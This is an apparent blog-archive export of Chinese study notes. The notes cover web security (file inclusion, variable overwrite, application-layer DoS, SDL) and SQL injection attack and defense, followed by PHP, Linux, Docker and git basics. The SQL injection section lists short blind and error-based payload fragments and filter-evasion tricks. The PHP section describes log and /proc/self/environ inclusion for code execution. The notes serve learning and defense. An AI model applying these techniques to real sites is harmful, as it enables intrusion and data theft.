时间随机的问题 时间可能被获取 伪随机数算法种子破解 系统自带的播种，多次访问结果相同 使用时间播种，可能被猜解时间 已知第一个随机数的值，可能被猜解到种子 通过发送 Keeo-Alive HTTP 头，迫使服务器使用同样进程响应请求，随机数只在开始播种一次 web应用，很多地方都可以取得随机数，从而提供猜解的可能 使用安全的随机数 多个随机数组合 - web 框架安全MVC 框架安全 模板引擎与xss防御 只进行html转义，为区分不同环境 慎重对待安全问题，不可盲从官方执导文档 web框架与CSRF防御 对读和写操作区分，csrf一般只针对写操作 利用框架对form表单添加token HTTP Headers 管理 在web框架中，可以对HTTP头进行全局化处理，一些基于HTTP头的方案可以很好的实施 对抗CRLF，只要在所有的HTTP头的value 中，编码、\r\n即可 针对302跳转，在统一的跳转函数实现白名单，或限制Locationg值 很多安全相关的headers ，可以统一在web框架中配置 框架提供统一的设置cookie函数 数据持久层与sql注入 ORM框架 其他 文件上传 spring MVC 自带的安全功能 日志的记录 与时俱进 web框架自身安全开发框架可能不及时更新，引发的后果可能很严重 struts 2命令执行漏洞 spring MVC 3.0.0-3.0.2 命令执行漏洞 django 0.95 命令执行漏洞 应用层拒绝服务攻击初步 DDOS 简介 SYN flood UDP flood ICMP flood 应用层ddos cc 攻击 对消耗资源大的页面不断发起正常请求，消耗服务器资源 入侵了一个浏览很大的网站后，引流攻击 防御 限制请求频率 问题 代理ip和cookie改变 应用代码做好性能优化 网络架构做好优化 验证码 可能被识别 出现过的问题 验证码消耗掉后，sessionID，未更新，导致原sessionID 可以一直重复提交同一个验证码 防御应用层的DDOS 调整apache 的参数 资源耗尽攻击 slowloris 攻击 构建一个为结束的http请求，保存连接，构建多个这样的连接 HTTP POST DOS 发POST 包时，指定一个很大的content-length值，然后以很低 的速度发包，构建多个这样的连接 server limit dos 一般web server 对http头的大小有限制 攻击者利用xss攻击，，恶意像客户端写一个超长cookie，则客户端无法访问cookie所在域的任何页面 reDOS 当正则表达式写的不好时，可能被恶意利用，消耗大量资源，从而造成dos, php 安全 文件包含漏洞 include等函数通过动态变量引入需要的文件 用户可以控制该动态变量 本地文件包含- 截断后续字符串 - 00截断 - 操作系统对目录的最大长度限制 - window 256 - linux 4096 - ./././ 或/// 或 ../1/abc/../1/abc 目录遍历 ../../ 返回到上层目录中 可以通过不同编码方式来绕过服务端的逻辑 解决 open_basedir 限制php能打开的文件在某个目录 使用枚举 远程文件包含 需要allow_url_include 为ON，加载远程文件 利用技巧 包含用户上传的文件 利用data://,php:// 伪协议 需要allow_url_include 为on 包含session 需要用户可以控制部分session 文件内容 php默认session 在/tmp 文件 包含日志文件 access_log 记录请求信息 error_log 记录出错信息 问题 日志数据量可能很大 凌晨包含 常见攻击 apache 读取httpd 的配置文件 httpd.conf,找到日志目录 错误回显泄露 web目录位置 猜解web目录位置 包含/proc/self/environ 文件 web运行的环境变量，其中很大都是用户可以控制的， 常见做法在user-agent 注入php代码 包含上传的临时文件（RFC1867协议） php为上传的文件创建临时文件，目录在php.ini upload_tmp_dir 中定义，默认为空，此时linux 使用/tmp 目录，windows使用c:\windows\temp 目录 随机函数不够安全，暴力猜解成为可能 包含其他应用创建的文件，比如数据库文件，缓存文件，应用日志等 变量覆盖漏洞 全局变量覆盖 register_glabals php 4.2.0 之后默认有ON改为OFF 为on，变量可能来自不同地方，表单，cookie等，可能导致变量覆盖 通过代码销毁 extract() 变量覆盖 值为EXTR_OVERWRITE时，变量导入时，会覆盖已有变量，缺省为此配置，第二个参数表示不覆盖 $$key 的可能变量覆盖 import_request_variables 变量覆盖 将GET,POST,COOKIE的变量导入全局，只需要简单的指定类型，不指定默认覆盖全局变量 parse_str() 变量覆盖，mb_parse_str() 解析url，如果指定第二个参数则存入该参数，否则导入全局 代码执行漏洞 危险函数代码执行 文件包含漏洞 危险函数eval(),popen(),system(),passthru(),exec() 应用写入服务器的文件内容和文件类型 其他执行代码的方式 直接执行代码的函数 文件包含 本地文件写入 preg_replace 代码执行 第一个参数如果存在/e 修饰符，则允许第一个或者第二个参数代码执行 动态函数执行 用户自定义的函数可以导致代码执行 curly syntax 回调函数执行代码 如果回调函数可控 unserialize() 导致代码执行 变量反序化 定制安全的php环境 php.ini register_globals open_basedir allow_url_fopen allow_url_include display_errors log_erroes magic_quotes_gpc cgi.fix_pathinfo 关闭此选项避免，CGI，文件解析问题 session.cookie_httponly session.cookie_secure safe_mode 加载了一些非官方的php 扩展，扩展自带函数则可能绕过safe_mode 此模式php6 被取消 disble_functions 在php 中禁用函数 web server 配置安全 apache 安全 非官方module 为apache 单独建立一个user/group 配置参数，对抗DDOs 保护好apache log nginx 自身服务器安全 JBoss 远程命令执行 默认安装会带一个管理后台，通过8080端口，访问/jmx-console 能够进入 可以远程加载war 包，导致命令执行 tomcat 远程命令执行 默认8080端口又后台 HTTP Parameter Pollution 通过GET POST 发送两个相同的参数，服务器如何选择 有些只取第一个 有些如.net 变成 a = test,test1 绕过一些服务器的逻辑判断 HPP攻击 互联网公司安全运营互联网业务安全 产品需要什么样的安全 安全方案的设计避免业务的冲突 互联网产品对安全的需求 具备了安全性，产品才是完整的 安全做好了，产品才能最终成熟 什么是好的安全方案 有效的解决问题 良好的用户体验 优秀的性能 认证 双因素认证用户体验问题 复杂密码安全吗？ 业务逻辑安全- 两套账号体系，绑定关系，只改一个 - 登录失败锁定账号一小时，竞拍网站，恶意登录，锁定出高价用户的账号 - 信息审核后发布，允许修改，修改后未审核 密码取回流程 改密码 进行敏感操作之前再次认证用户身份 密码取回流程 三种方法 安全问题，安全邮箱，手机短信验证码 认证信息可能之前被修改 给用户多种认证选择 三种都不可靠时，利用用户在网站留下的私有信息，类似qq的申述 账号如何被盗的 账号被盗的途径 登录过程无HTTPS 用户电脑中木马，记录键盘 钓鱼网站 登录入口别暴力破解 取回流程的逻辑漏洞 xss漏洞，被间接窃取 sql注入漏洞 问题 暴力破解 常用密码 网络嗅探 数据库明文密码 分析账号被盗的原因 事先考虑问题的可能性，有针对性的向客户提问题，大胆假设，小心求证 从日志中寻找证据 打入敌人内部 互联网的垃圾 垃圾的危害 垃圾注册 新用户奖励机制 发广告和推广信息 垃圾的处理 网络钓鱼 简介 仿冒网站 欺骗性域名 传播途径 邮件钓鱼 SMTP协议可以由用户伪造发件人邮箱 识别发件人的安全技术，基于域名策略 SPF技术， Yahoo 的DomKeys 使用公私钥 微软的Sender ID技术 基于SPF，ip策略 SPF 基于ip难以维护 钓鱼网站的防控 控制钓鱼网站传播的途径 多方合作 浏览器 直接打击 用户教育 自动化识别 url，域名 0 l，源码的相似性 网购流程的钓鱼 网购流程中每个平台都有一套自己的账户体系，没有对应关系，不知道谁完成了订单 账户信息难以对应 使用客户端ip做完统一信息，比较经济 用户隐私保护 互联网用户隐私挑战 精准的广告投放 用户在网站填写的个人信息 搜索记录 ip地址对应的物理地址 如何保护用户隐私 用户因该有知情权和选择权 网站应该妥善保管，不用于指定范围的其他用途 Do-Not_Track http增加一个header 头，告诉网站用户不想被追踪 输入法云端分析需求，职业 iphone，安卓跟踪位置安全开发流程（SDL） 简介 安全开发生命周期 敏捷SDL 瀑布法开发 微软的SDL不适合敏捷开发 敏捷SDL SDL 实战经验 与项目经理进行充分的沟通，派出足够的时间 规范立项流程，确保所有项目都通知安全团队 树立安全部门的权威，项目必须由安全部门审核 将技术方案写入开发，测试的工作手册中 给工程师培训安全方案 记录所有安全的bug鼓励程序员写安全代码 需求分析与设计阶段 开发阶段 提供安全的函数 ESAPI 将安全方案写入开发规范中 代码安全审计工具 找敏感函数，回溯 找用户可能的输入口，看传递情况 对于甲方公司， 安全运营 把安全运营起来 安全是一个持续的过程 漏洞修补流程 安全监控 捕捉异常流程 入侵检测 IDS,IPS,DDOS监控设备,WAF, modsecurity phpids 紧急响应处理流程 邮件报警 IM报警 短信报警 紧急响应小组 保护安全事件的现场 最快的速度处理问题]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>学习笔记</tag>
        <tag>白帽子讲web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入攻击与防御笔记]]></title>
    <url>%2Fold_post%2Fsql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[笔记 sql基本利用产生原因 利用方法 使用条件语句基于时间 mysql BENCHMARK(10000,sha1(‘blah’)); mysql 5.0.12版本以后 sleep()基于错误 ?id = 1/返回值 基于内容-？id = 1%2B(返回值) 处理字符串 ？brand=ac’%2B’char(108+(返回值))’%2B’e 扩展攻击 len() 获取长度 10/(case+when+(len(user())&gt;8)+then+1+else+0end) ascii(substring((select system_user),1,1))- 利用sql注入错误 ？id = char(65+返回值) 触发强制类型转换错误，可以得到a或b ？id = 1+having+1=1 错误消息会返回一个表名和列名 ?id=1+group+by+products.id,products.name+having+1=1 不断遍历，得到后面的列 其他错误,xml函数 枚举数据库模式 information_schema mysql5以后 暴力猜解表名 在insert中实施注入攻击 使用单引号闭合，插入子查询，利用注释闭合后面语句 可控制字符是最后 一个参数， 利用整数和最后一个字符串相加返回整数 利用ascii 转化整数 利用insert 错误 使内部子查询成功，外部insert失败，避免污染数据库 子查询返回两行错误查询将终止 后面union 确保返回两行数据 基于时间速度慢 利用regexp 可在在应用层返回错误不同查询 其他情况 堆叠查询 插入管理员账户 提升权限窃取哈希口令 select user,password FROM mysql.user 带外通信 e-mail HTTP/DNS 文件系统 自动化利用sqlmapsql盲注寻找并确认SQL盲注强制产生通用错误 应用程序经常使用通用的错误页面替换数据库错误 提交单引号推断sql注入是否可行 注入带副作用的查询 sleep() ‘ and ‘1’ = ‘2 拆分与平衡 2+5 代替 5 a’||’b 常见的sql盲注场景 无效查询返回通用的错误页面，正确的查询返回内容可被适度控制的页面， 提交受损或不正确的SQL，既不产生错误页面，也不会以任何方式影响页面 基于时间的盲注，或者带外副作用的漏洞 注入方法 二分法 位运算 基于时间的技术 sleep() benchmark 使用非主流通道 数据库连接 DNS渗漏 e-mail 渗漏 http渗漏 ICMP 渗漏 系统 udf mof 高级话题避开输入过滤器 大小写 sql注释 /!4501/ un/**/ion url 编码 双url编码 非标准unicode 编码 eval动态执行 拼接字符串 空字节攻击 00截断 只过滤一次 利用截断 输入过滤器截断输入为16个字符，替换单引号为双引号 利用截断，把引号放在第16位，成功闭合前面 其他截断攻击 邮箱 很多空字节 攻击者邮箱 避开自定义过滤器 利用过滤器对字符串的处理 使用非标准入口 参数名 应用可能分析referer 获取用户如何进入的数据，可能存在注入二阶sql注入 输入数据经过转义进入数据库，再次从数据库拿出来，拼接sql，可能会绕过之前的转义 客户端sql注入 html5访问本地数据库]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>学习笔记</tag>
        <tag>sql注入攻击与防御</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php学习笔记]]></title>
    <url>%2Fold_post%2Fphp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[笔记 php 基础php 对象概念 多态 继承 仅允许继承一个父类 操作创建123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123// 创建类class classname()&#123; // 以下操作符，不光可以设置属性，也可以设置，函数 public $attribute1; // 默认为public，可以不指定，可以在类的内部和外部访问 private $attribute2; // 只能在类的内部访问，不会被继承 proctected $attribute3; // 只能在类的内部访问，可以被继承,继承后只能在子类访问 function operation($param)&#123; $this-&gt;$attribute1=1; // this指向当前实例化的对象，可以操作对象值 &#125; // 构造函数，创建变量时自动执行 php5 function __construct($param)&#123; &#125; // 析构函数，销毁一个类时自动执行 function __destruct($param)&#123; &#125; // 外部属性的设置 function __get($attriname)&#123; return $attriname; // 重写直接访问实例化对象属性的返回值 &#125; function __set($attriname,param)&#123; $attriname=$param; // 重写直接设置实例化对象属性的值 &#125; &#125;// 类的实例化$a = new classnew(&quot;Fisrt&quot;); //参数会传入__construct// 继承class B extends A&#123; &#125;Final class A()&#123; //禁止A类被继承&#125;// 重载//子类的同名属性和方法会重载父类的class A()&#123; //禁止A类的这个函数被子类重载 final function operation()&#123; &#125; &#125;// 接口,为解决不能多重继承的问题，一个类实现多个接口，interface Displayble() //定义接口&#123; const B=&quot;1&quot;; function display()； 接口只有抽象函数，和静态常量&#125;// 高级功能// pre-class 常量class Math()&#123; const PL=3.14 //常量，可以不需要初始化该类而使用&#125;echo &apos;Math::pi=&apos;.Math::pi.&apos;\n&apos;;// 静态方法再类的方法前加static 可以在为初始化类前通过和pre-class一样的方式调用// 检查类的类型和类型提示$b instanceof B;// 检查b是不是B的实例化，B也可以为父类function check_hink(B $someclass)&#123;&#125; ; // 要求传入的对象必须为B或B子类的实例化// 延迟静态绑定public static funtion test()&#123; static::who(); // 当在子类调用父类这个方法时，这个方法会调用子类重载的who方法&#125;// 克隆对象$c = clone $b; //$c 完整克隆对象$b，会调用c的__clone()方法//抽象类// 类不能被实例化，对应的方法也没有实现，主要用于负责的类层次关系中abstract class A&#123; abstract funtion operationX();&#125;// __call 重载方法public funtion _call($method,$p)&#123; if($method=&quot;display&quot;)&#123; display($p[0]);&#125;&#125;// __autoload 方法//一个独立的函数，定义在类外，将在任何类实例化时调用funtion __autoload($name)&#123; include_once($name.&apos;.php&apos;);&#125; //实现包含类初始化需要的和类名字相同的文件 // 迭代器和迭代 // __toString // 类的实例可以通过字符串显示 // 反射API // 获得类的详细信息 $classInfo = new ReflectionClass(&apos;Page&apos;); php异常处理概念12345678910111213141516// 引发异常throw new FileopenExpection(); // 异常处理try&#123;&#125;catch(Exception $e)&#123; echo $e;&#125;&gt;用户定义的异常都继承与exception类，可以重新toString函数 mysql 数据库电子商务与安全性PHP高级技术文件交互文件上传php.ini 相关指令1234567file_uploads // 控制是否允许http方式进行文件上传upload_tmp_dir #指定文件被处理之前的临时目录，如果没有指定，则为系统默认值upload_max_filesize #控制允许上传的最大大小，如果大于该值，则创建一个0size的占位文件，默认2Mpost_max_size # post方法上传数据的最大值，默认8m，必须大于文件上传的值 文件上传的html代码可以使用POST也可以使用PUT， 在form的标记中，必须设置属性enctype=”multipart/form-data” 必须有一个设置上传文件最大长度的表单域，这是一个隐藏的域名1&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILW_SIZE&quot; value=&quot;10000&quot;&gt; 编写处理的php当文件被上传时，文件保存在临时目录中，如果脚本执行完不操作，文件将会被删除 需要处理的数据在$FILE中]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>php 基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 基础]]></title>
    <url>%2Fold_post%2Flinux-%E5%9F%BA%E7%A1%80.html</url>
    <content type="text"><![CDATA[笔记 文件 和目录无盘符，之间根目录/ ls 可以加选项 -a显示隐藏文件 -h 转换显示的大小格式 -l显示详细信息，以列表的方式，-ahl -a -h -l无影响， 可以以其他路径作为参数，参数和选项的前后位置无影响 也可以使用类似正则表达式显示特定文件，一个任意字符是“？” cd cat cat 1.txt 2.txt &gt;3.txt 可以合并文件 pwd touch mkdir rmdir clear 可以使用ctrl+l rm -i 删除每个文件前都提示 -f强制删除，忽略不存在 的文件，不提示 递归删除目录下的内容，删文件必须加这个参数 ln 软连接 ln -s 源文件 链接文件 类似快捷方式，源文件删了就没用了 硬链接 直接ln，增加文件的引用计数，删源文件，计数不为0，其实没删 mv 重命名 mv 源文件 重命名文件 选项 含义 -f 禁止交互式操作，如有覆盖也不会给出提示 -i 确认交互方式操作，如果mv操作将导致对已存在的目标文件的覆盖，系统会询问是否重写，要求用户回答以避免误覆盖文件 -v 显示移动进度 cp 复制文件 选项 含义 -a 该选项通常在复制目录时使用，它保留链接、文件属性，并递归地复制目录，简单而言，保持文件原有属性。 -f 已经存在的目标文件而不提示 -i 交互式复制，在覆盖目标文件之前将给出提示要求用户确认 -r 若给出的源文件是目录文件，则cp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名。 -v 显示拷贝进度 归档管理 tar -cvf test.tar * 将当前目录所有文件打包为test.tar tar -xvf test.tar 解包 gzip 压缩tar打包的文件 gzip test.tar test.tar.gz d 解压 -f 压缩所有子目录 可以利用tar的-z选项调用gzip tar -zcvf test.tar.gz * tar -zxvf test.tar.gz 可以利用 -C 指定解压目录 bzip2同gzip另一种压缩格式 压缩用法：tar -jcvf 压缩包包名 文件…(tar jcvf bk.tar.bz2 *.c) 解压用法：tar -jxvf 压缩包包名 (tar jxvf bk.tar.bz2) 文件压缩解压：zip、unzip 通过zip压缩文件的目标文件不需要指定扩展名，默认扩展名为zip。 压缩文件：zip [-r] 目标文件(没有扩展名) 源文件 解压文件：unzip -d 解压后目录文件 压缩文件 grep 搜索文本 grep [-选项] ‘搜索内容串’文件名 可以 -V 求反，-n 显示匹配的行号，-i 忽略大小写 搜索内容串可以使用正则 find 查找文件 find ./ -name test.sh 查找当前目录下所有名为test.sh的文件，可以使用正则 选项 大于2m，-size +2M 等于2m -size 2M，-perm 0777 权限是用户权限管理查看 whoami 查看当前用户 查看登录用户退出exit 账号管理账号useradd -d 指定主目录 自动建立主目录 -g 指定组名称 示例： useradd -d /home/a a -g test -m passwd 设置密码超级管理员可以给普通用户设置密码用户可以对自己使用，不用加用户名 userdel删除用户 userdel -r abc(用户名) -r 同时删除主目录 su 切换用户，加- 同时进入主目录su - root 组一个账号可以有多个组，一个默认组查看有那些组 cat /etc/group groupmod +三次tab键 添加、删除组账号：groupadd、groupdel，基本同user 修改用户所在组：usermod usermod -G 用户组 用户名 -a表示追加，-g表示改变默认组 想要使用sudo，需要把用户加入 adm和shudo组里面sudo usermod -a -G adm 用户名 sudo usermod -a -G sudo 用户名 查看用户在哪些组groups 用户名 文件权限修改文件权限：chmod 字母法：chmod u/g/o/a +/-/= rwx 文件名 数字法 chmod 777 test/ -R -R 表示递归的给所有目录加权限 读4，写2，执1，无任何权限0，顺序是所有者，同组，其他 修改文件所有者：chown chown 用户名 文件 修改文件所属组：chgrp chown 组名 文件 系统管理查看进程 ps -aux 动态显示 top kill 终止进程kill [-signal] pid kill -9 pid表示强制终止 关机shutdowninit 0重启rebootinit 6 磁盘相关检测磁盘空间：df -m 检测目录所占磁盘空间：du du -s build -h 网卡ifconfig查看信息 sudo ifconfig ens33 192.166.1.110 修改ip ping 杂项帮助文档 命令自带ls –help manf 翻一屏b 上翻一屏 空格 显示下一屏回车 下一行h 列出所有功能键/word 搜索word字串符 自动补全 TAb 历史命令 history 可以使用！+命令前的数字编号快速执行 文件位置 which 命令 杂 分屏显示：more具体快捷键同man 管道 | 把前一命令的输出作为后面的输入 重定向 写入文件同w 写文件同a]]></content>
      <categories>
        <category>杂乱</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>linux 基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 基础]]></title>
    <url>%2Fold_post%2FUntitled%202.html</url>
    <content type="text"><![CDATA[笔记]]></content>
      <categories>
        <category>杂乱</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>linux 基础</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2Fold_post%2F%E7%88%AC%E8%99%AB.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[rss制作]]></title>
    <url>%2Fold_post%2Frss%E5%88%B6%E4%BD%9C.html</url>
    <content type="text"><![CDATA[微信，普通博客 rss的制作，一些博客的整理 微信rss制作i春秋]]></content>
      <categories>
        <category>学习方法相关</category>
      </categories>
      <tags>
        <tag>rss</tag>
        <tag>自制</tag>
        <tag>资讯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Djang部署教程]]></title>
    <url>%2Fold_post%2FDjang%E9%83%A8%E7%BD%B2%E6%95%99%E7%A8%8B.html</url>
    <content type="text"><![CDATA[传智博客的python的笔记 算了，下次部署的时候再写吧]]></content>
      <categories>
        <category>web开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Django</tag>
        <tag>python</tag>
        <tag>web开发</tag>
        <tag>mvt</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 基础]]></title>
    <url>%2Fold_post%2Fdocker.html</url>
    <content type="text"><![CDATA[第一本Docker书，笔记 简介核心组件 Docker客户端和服务端 Docker是c/s 架构的程序，Docker 客户端向Docker服务器或守护进程发送请求，服务器或者守护进程将完成所有工作并返回结果，可以将守护进程和客户端分开，也可以运行在同一宿主机 镜像 类似面向对象里的类 Registry Docker利用Registry保存用户构建的镜像，分共有和私用两种 可以在Docker Hub在注册账号，分享自己的镜像，可以公有也可以私有 可以自己搭建 registry Docker 容器 类似对象 安装百度- 基本使用info 命令返回所有容器和镜像的数量，使用的执行驱动和储存驱动。 helpdocker help run 或者 man docker-run 容器的运行docker run --name hello -i -t ubuntu:15.10 /bin/bash 解析： run 表示运行一个容器， -i 表示 STDIN 是开启的，即开启持久的标准输入 -t 表示 为容器分配一个伪tty终端，即提供一个交互式shell 接下来告诉Docker以什么创建容器，引号后面指定版本，可以不指定，实例使用的是base镜像，如果本机有，直接使用，没有则从仓库拉取 最后告诉容器运行什么命令，即运行一个交互式shell 退出shell后容器就会停止运行，因为容器基于bash启动，bash结束，容器结束 –name 为容器指定一个名字 -v 将本机目录挂载为容器的一个卷，前面是本机目录，后面是容器目录可以指定状态，ro，只读，或rw 读写 使用参数-d 创建守护式容器，后台运行 管理ps列出当前运行的容器加上-a 后，会列出所有，包括已经停止的-l 会列出最后一次运行的容器，包括已停止的的-n 3 列出最后3个容器 attachdocker attach id or name 附着到该容器的会话上 exec 命令在容器内部额外启动新进程 运行一个后台进程docker exec -d name touch /ect/new_file 前台docker exec -t -t name /bin/bash logsdocker logs name or id 获取容器的日志 可以添加-f参数 来一直监控Docker的日志-t 参数，为日志加上时间戳 top命令用法同上，查看容器的进程 inspect 命令获取容器信息， 启动与关闭docker start container_name或者id 运行一个已经停止的容器，restart命令，重新运行一个新容器 stop 命令使用stop命令，可以停止守护进程，向容器发送STGERM信号 快速停止使用 kill 命令，发送SIGKILL信号 restart 标志 自动重启容器 always 表示无论退出代码是什么，都自动重启，标志还有on-failure 表示只有退出代码非0才会自动重启，可以接受一个可选参数 on-failure:3 rm命令删除容器 docker rm `docker ps -a -q` 删除所有容器，-表示只返回容器id 容器内基本使用 hostname在容器内的shell使用，查看容器的id cat /etc/hosts ip a ps -aux exit 或者ctrl—+d 退出容器 Docker 镜像和仓库是什么 Docker 镜像由文件系统叠加而成，利用联合加载（union mount），这些文件系统称之为镜像，镜像启动容器时会在在最顶层加载一个文件读写系统， 写时复制，文件系统的变化只应用在读写层，底层不变， 基本操作 列出镜像docker images 本地镜像都在/var/lib/docker 目录下容器在/var/lib/docker/containers 镜像从仓库下载而来，仓库在registry ，默认的registry是Docker Hub可以自建 拉去镜像 可以直接运行（run），自动拉去， 如果为指定标签，会自动下载:latest标签的镜像 也可以使用pull命令提前拉去docker pull ubuntu会拉取这个仓库下所有镜像，利用docker pull ubuntu：12.10 标签特定的镜像层 docker有两种仓库 用户仓库 -由用户名/仓库名 组成 顶层仓库 只包含仓库名，右Docker和特定厂商管理 查找镜像 docker search ubuntu 查找Docker上所有公共可用的镜像， 构建镜像 我们不是真正 的构建镜像，只是从已有的基础镜像，构建新镜像而且，如果像构建一个全新的镜像，参考 #### 在Docker hub 创建账号 使用docker login 命令在本地登录，登录后的个人信息会在$HOME/.dockercfg中 可以使用 docker inspect 命令查看新创建爱的镜像的详细信息 docker commit 命令不推荐先利用镜像创建一个容器，在容器内更改 利用Dockerfile构建镜像 推荐这种方式，基于DSL语法的指令构建镜像，之后利用Docker build 命令构建一个新镜像，便于修改。 在一个目录下创建一个Dockerfile文件 Dockerfile由一系列指令和参数构成，指令必须大写，后面会跟一个参数，每条指令都会创建一个新的镜像层，并对镜像提交，如果其中一步构建失败，可以使用最后构建 的镜像进行调试 默认run指令会在shell里使用.bin.sh -c 执行，可以使用exec格式的run指令，，将在bash中执行EXPOSE 指令，告诉DOCker容器内应用程序要使用的端口，Docker不会在创建容器时自动打开，需要在run指令中指定 可以使用多个EXPOSE 指令指定多个端口 使用docker bulid 命令，Dockerfile中的所有指令都会被执行提交，并返回一个新镜像，可以使用-t=“仓库名/镜像名：标签”，如果没有定制标签，会使用latest标签上述代码会自动在当前目录寻找一个Dockerfile文件，可以指定git仓库，在其中寻找 如果指令失败 可以使用run指令 访问最后一次成功，查找原因 每一步构建都会缓存，方便修改后直接从成功的那一步开始，可以在bulid命令上加上 –no–cache 忽略构建 的缓存-使用相同的指令集模板，尽可能确保缓存命中MAINTAINER 设置联系方式ENV 新的环境变量，例子中表示模板的最后更新时间，可以利用这个刷新一个构建，解决ａｐｔ－ｇｅｔ ｕｐｄａｔｅ 更新问题 － docker history 命令，查看一个镜像如何被构建出来 注意启动容器时需要一个前台进程，不然容器会被结束前面是宿主机的端口，后面是容器的，只写一个随机分配一个高端口，可以在端口后加上/udp 是端口使用udp协议，默认tcp，可以在端口前加入ip地址绑定ip 还可以使用 -P 参数，将Dockerfile里EXPOSE的端口以随机高端口的方式暴露 可以通过 port con_name 80 查看映射的端口 Docker指令 CMD 加命令的语法童RUN， 镜像被运行为容器时执行的命令，类似docker run后面的参数，会被run命令最后面的参数覆盖，只能有一条 ENTRYPONT 不会被run覆盖，将run的参数在作为参数传递给ENTRYPOINT，如果确实需要，可以使用run 的–entrypoint 标志覆盖ENTRYPOINT命令 WORKDIR 指定创建新容器时，内部的工作目录，CMD或ENTRYPOINT 指定的程序会在这个目录执行，可以利用run的-w参数指定新目录覆盖原目录， ENV 指令 添加环境变量，会被添加到容器中 可以在RUN中直接使用，可以利用反斜线使用原值 在Dockerfile使用需要加$， USER 指令 指定使用的用户组，默认root 可以在run中使用 -u选项覆盖 VOLUME 向基于镜像创建的容器添加卷，实现文件在容器间共享和重用，卷会一直存在到没有容器使用 ADD 命令 将构建环境下的文件和目录复制到镜像中，如果以/结尾，则复制整个目录，只能使用构建上下文的文件，可以使用url，如果是归档文件，指定为目录，可以自动解包， COPY命令 同ＡＤＤ ，不过不做文件提去和解压 ＯＮＢＵＬＬＤ 能为镜像添加触发器，后面根ＲＵＮ等命令，当此镜像要作为其他镜像的父镜像时，触发器的内的代码会执行，作为祖先镜像则不会 推送到Hub用户名/仓库名 可以利用Dockerfile自动构建 删除镜像docker rmi 删除一个镜像docker rm 删除容器 运行自己的Registrydocker run -p 5000:5000 registry 上传镜像，在镜像明前加上主机名和端口 容器连接 利用端口连接 Docker自己的网络栈 Docker会自己创建一个网络借口，docker0，可以使用ip a show dpcker0 查看，问题，容器重启后ip会变，解决，利用docker 的容器互联，docker自动更新ip docker 容器互联 在父容器加上–link：别名选项,指定一个要连接的容器，要连接的容器可以不映射端口， 利用host ，里面的别名指定了ip，或者env环境变量，在容器内访问，可以利用–dns 标志网为容器单独配置dns]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git笔记]]></title>
    <url>%2Fold_post%2Fgit%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[廖雪峰的git的笔记 基本操作创建版本库初始化一个git仓库 git init 添加文件 git add test.txt 文件提交 git commit -m &quot;wrote a readme file&quot; 查看状态 git status 查看和上个版本的差异，显示的格式正是Unix通用的diff格式 git diff readme.txt用git diff HEAD – readme.txt命令可以查看工作区和版本库里面最新版本的区别： 版本回退查看提交记录，从最近到最远排列，可以加上–pretty=oneline参数，只显示id git log 回退到上一个版本,^^^ 表示上三个版本,HEAD~100,回退到前100个版本 git reset --hard HEAD^ 用来记录你的每一次命令，回退后可以重回未来 git reflog 工作区和暂存区工作区为当前文件目录，使用add添加到暂存区，commit提交才会修改，否则内容不会改变，即使上次提交前add过 git checkout – readme.txt 可以丢弃工作区的更改，如果曾经放入暂存区，则是暂存区的状态 it reset HEAD 可以把暂存区的修改撤销掉（unstage） git rm用于删除一个文件 使用远程仓库在自己的电脑生出密匙，将公钥，添加在githubssh-keygen -t rsa -C “youremail@example.com“ 关联远程仓库，可以关联多个，要换名字，分别推送 git remote add origin git@github.com:michaelliao/learngit.git 第一次推送 git push -u origin master 推送后git push origin master 克隆git clone git@github.com:michaelliao/gitskills.git 有多种协议 删除远程库的关联git remote rm origin 分支$ git branch dev // 创建分支$ git checkout dev // 切换分支 可以使用一条命令 git checkout -b dev 删除分支git branch -d dev 用git branch命令查看当前分支 会列出所用分支，当前分支前有一个* git merge dev 把分支合并的当前分支合并分支时，加上–no-ff参数和-m就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而fast forward合并就看不出来曾经做过合并 当分支合并冲突时，手动解决冲突的文件，在提交 git log –graph命令可以看到分支合并图 当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后 再git stash pop，回到工作现场。 用git stash apply恢复，但是恢复后，stash内容并不删除，可以用git stash list查看，你需要用git stash drop来删除； 多人协作当你从远程仓库克隆时，实际上Git自动把本地的master分支和远程的master分支对应起来了，并且，远程仓库的默认名称是origin。 要查看远程库的信息，用git remote： 12$ git remoteorigin 或者，用git remote -v显示更详细的信息： 123$ git remote -vorigin git@github.com:michaelliao/learngit.git (fetch)origin git@github.com:michaelliao/learngit.git (push) 上面显示了可以抓取和推送的origin的地址。如果没有推送权限，就看不到push的地址。 